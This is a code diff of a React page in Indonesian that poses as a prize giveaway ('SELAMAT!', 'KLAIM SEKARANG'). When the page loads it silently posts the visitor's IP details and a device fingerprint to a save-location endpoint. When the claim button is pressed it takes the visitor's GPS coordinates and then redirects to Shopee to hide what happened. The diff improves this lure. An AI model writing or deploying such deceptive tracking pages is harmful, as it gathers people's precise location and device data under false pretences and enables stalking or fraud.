@@ -9,6 +9,8 @@ export default function TrackPage() {
   const [deviceInfo, setDeviceInfo] = useState<any>(null);
   const [loading, setLoading] = useState(false);
 
+  const ready = ipData && deviceInfo;
+
   useEffect(() => {
     async function run() {
       const ipRes = await fetch("/api/get-ip");
@@ -18,10 +20,9 @@ export default function TrackPage() {
       const d = getDeviceInfo();
       setDeviceInfo(d);
 
-      // INSERT FIRST TIME (NO GPS)
       await fetch("/api/save-location", {
         method: "POST",
-        headers: {"Content-Type": "application/json"},
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           ...ipJson,
           ...d,
@@ -30,60 +31,57 @@ export default function TrackPage() {
         }),
       });
 
-      setTimeout(() => confetti({ particleCount: 150, spread: 80 }), 300);
+      setTimeout(() => confetti({ particleCount: 120, spread: 90 }), 300);
     }
 
     run();
   }, []);
 
   async function handleClaim() {
+    if (!ready) return alert("Sedang memuat data, coba 1 detik lagi");
+
     setLoading(true);
 
-    if (!ipData || !deviceInfo) {
-      return (window.location.href = "https://shopee.co.id");
-    }
+    const fullPayload = {
+      ...ipData,
+      ...deviceInfo,
+    };
 
-    if ("geolocation" in navigator) {
-      navigator.geolocation.getCurrentPosition(
-        async (pos) => {
-          await fetch("/api/save-location", {
-            method: "POST",
-            headers: {"Content-Type": "application/json"},
-            body: JSON.stringify({
-              ...ipData,
-              ...deviceInfo,
-              gpsLat: pos.coords.latitude,
-              gpsLon: pos.coords.longitude,
-            }),
-          });
+    navigator.geolocation.getCurrentPosition(
+      async (pos) => {
+        await fetch("/api/save-location", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            ...fullPayload,
+            gpsLat: pos.coords.latitude,
+            gpsLon: pos.coords.longitude,
+          }),
+        });
 
-          confetti({ particleCount: 300, spread: 100 });
+        confetti({ particleCount: 300, spread: 100 });
 
-          setTimeout(() => {
-            window.location.href = "https://shopee.co.id";
-          }, 1200);
-        },
+        setTimeout(() => {
+          window.location.href = "https://shopee.co.id";
+        }, 1200);
+      },
 
-        async () => {
-          await fetch("/api/save-location", {
-            method: "POST",
-            headers: {"Content-Type": "application/json"},
-            body: JSON.stringify({
-              ...ipData,
-              ...deviceInfo,
-              gpsLat: null,
-              gpsLon: null,
-            }),
-          });
+      async () => {
+        await fetch("/api/save-location", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            ...fullPayload,
+            gpsLat: null,
+            gpsLon: null,
+          }),
+        });
 
-          setTimeout(() => {
-            window.location.href = "https://shopee.co.id";
-          }, 1200);
-        }
-      );
-    } else {
-      window.location.href = "https://shopee.co.id";
-    }
+        setTimeout(() => {
+          window.location.href = "https://shopee.co.id";
+        }, 1200);
+      }
+    );
   }
 
   return (
@@ -91,15 +89,24 @@ export default function TrackPage() {
       <div style={styles.card}>
         {loading ? (
           <>
-            <h2 style={styles.title}>⏳ Tunggu Sebentar...</h2>
-            <p style={styles.text}>Memverifikasi hadiah Anda…</p>
+            <h2 style={styles.title}>⏳ Memverifikasi...</h2>
+            <p style={styles.text}>Harap tunggu sebentar…</p>
           </>
         ) : (
           <>
             <h2 style={styles.title}>🎉 SELAMAT!</h2>
-            <p style={styles.text}>Anda mendapatkan hadiah menarik!</p>
+            <p style={styles.text}>
+              Anda mendapatkan kesempatan hadiah menarik!
+            </p>
 
-            <button style={styles.button} onClick={handleClaim}>
+            <button
+              style={{
+                ...styles.button,
+                opacity: ready ? 1 : 0.5,
+                pointerEvents: ready ? "auto" : "none",
+              }}
+              onClick={handleClaim}
+            >
               🎁 KLAIM SEKARANG
             </button>
           </>
@@ -118,15 +125,26 @@ function getDeviceInfo() {
   else if (ua.includes("android")) os = "Android";
   else if (ua.includes("iphone")) os = "iPhone iOS";
   else if (ua.includes("ipad")) os = "iPad iOS";
-  else if (ua.includes("linux")) os = "Linux";
 
   let deviceType = "Desktop";
   if (/mobile/i.test(ua)) deviceType = "Mobile";
   if (/tablet/i.test(ua) || ua.includes("ipad")) deviceType = "Tablet";
 
   const brands = [
-    "Samsung", "Xiaomi", "Oppo", "Vivo", "Realme", "Infinix",
-    "Poco", "Huawei", "Nokia", "Sony", "Asus", "Lenovo", "iPhone", "iPad"
+    "Samsung",
+    "Xiaomi",
+    "Oppo",
+    "Vivo",
+    "Realme",
+    "Infinix",
+    "Poco",
+    "Huawei",
+    "Nokia",
+    "Sony",
+    "Asus",
+    "Lenovo",
+    "iPhone",
+    "iPad",
   ];
 
   let brand = "Unknown";
@@ -146,28 +164,26 @@ const styles: any = {
     display: "flex",
     justifyContent: "center",
     alignItems: "center",
-    padding: 20,
   },
   card: {
     background: "#fff",
     padding: 30,
     maxWidth: 360,
-    width: "100%",
-    borderRadius: 18,
+    borderRadius: 15,
     textAlign: "center",
-    boxShadow: "0 6px 20px rgba(0,0,0,0.2)",
+    boxShadow: "0 6px 18px rgba(0,0,0,0.15)",
   },
-  title: { fontSize: 28, fontWeight: "bold", marginBottom: 10 },
-  text: { fontSize: 16, marginBottom: 15 },
+  title: { fontSize: 26, marginBottom: 10 },
+  text: { fontSize: 16 },
   button: {
     background: "#ff5722",
-    padding: "14px 20px",
+    padding: 14,
+    marginTop: 20,
     borderRadius: 10,
-    color: "white",
-    width: "100%",
     border: "none",
-    cursor: "pointer",
+    color: "#fff",
     fontSize: 18,
-    fontWeight: "bold",
+    cursor: "pointer",
+    width: "100%",
   },
 };
